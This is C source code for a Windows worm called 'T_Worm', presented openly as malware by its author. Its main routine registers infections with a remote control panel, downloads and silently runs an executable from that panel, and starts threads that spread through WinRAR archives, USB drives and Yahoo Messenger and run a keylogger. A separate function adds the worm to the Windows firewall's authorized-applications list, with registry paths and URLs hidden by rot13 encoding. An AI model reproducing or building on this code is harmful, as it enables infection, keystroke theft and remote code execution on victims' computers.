#include "include.h"
    
   /*\______________             ____                      ___________________
  /                /|  ,-,______/    \______/\________    /                   \
 /By: h1t3m       / | /_____   /      \   __  \       \  /                    /
/_____      _____/  | ___  /  /  /\    \ (__) /    ,\  \/                    /
     /     / \      |/ _ \/  /  (__)   /  __  \__  | \    /\                /
     \     \  \_______/ \____\________/   | \____\_|  \__/  \root@h1t3m.org/
	  \_____\                        |____|                  \___________*/

// Config //
// rot13 encode both chars (http://theblob.org/rot.cgi?)
char t_panel[]	= "uggc://fvgr.pbz/g_jbez.cuc"; //Admin panel http://site.com/t_worm.php
char yim_link[] = "uggc://fvgr.pbz/svyr.cuc"; //Link to spread on yahoo (http://site.com/file.php)
// Config //

static char* T_Worm_Message = "Hello antivirus companies, please call this worm w32.T_Worm"; // Do not remove

void BypassFirewall(char lfile[MAX_PATH])
{
	HKEY reg;
	char t[512];
	_snprintf(t, sizeof(t),r13("%f:*:Ranoyrq:G_Jbez"), lfile);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, r13("FLFGRZ\\PheeragPbagebyFrg\\Freivprf\\FunerqNpprff\\Cnenzrgref\\SverjnyyCbyvpl\\FgnaqneqCebsvyr\\NhgubevmrqNccyvpngvbaf\\Yvfg"), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, 0);
	RegSetValueEx(reg, lfile, 0, REG_SZ, (const unsigned char *)t, strlen(t));
	RegCloseKey(reg);
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
{
	char buff[256], buff2[256];
	bool Lewp = true;
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, "w32.T_Worm"), 15000) == WAIT_TIMEOUT) {
		ExitProcess(EXIT_FAILURE);
	}

	//Install
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Install, 0, 0, 0);
	Sleep(1000);

	//Log to panel
	sprintf(buff, "%s?do=log", r13(t_panel));
	URLDownloadToFile(0,buff,0,0,0);
	Sleep(1000);

	//Download file
	char dl_to[256];
	sprintf(dl_to, "C:\\%s.exe", GenerateRandomLetters(5));
	DeleteFile(dl_to);
	sprintf(buff2, "%s?do=dl", r13(t_panel));
	URLDownloadToFile(NULL,buff2,dl_to,NULL,NULL);
	Sleep(1000);
	ShellExecute(NULL,"open",dl_to,NULL,NULL,SW_HIDE);
	Sleep(1000);

	//WinRAR Injection
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RarWorm, 0, 0, 0);
	Sleep(1000);

	//Start USB Thread
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)FindRemoteDrive, 0, 0, 0);
	Sleep(1000);

	//Start Yahoo thread
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)YahSend, 0, 0, 0);
	Sleep(1000);

	//Start keylogger
	CreateThread(0, 0, &KeyLogger, 0, 0, 0);
	Sleep(1000);

	//Loop
	while(Lewp)
	{
		Sleep(60000);
	}
	return 0;
}
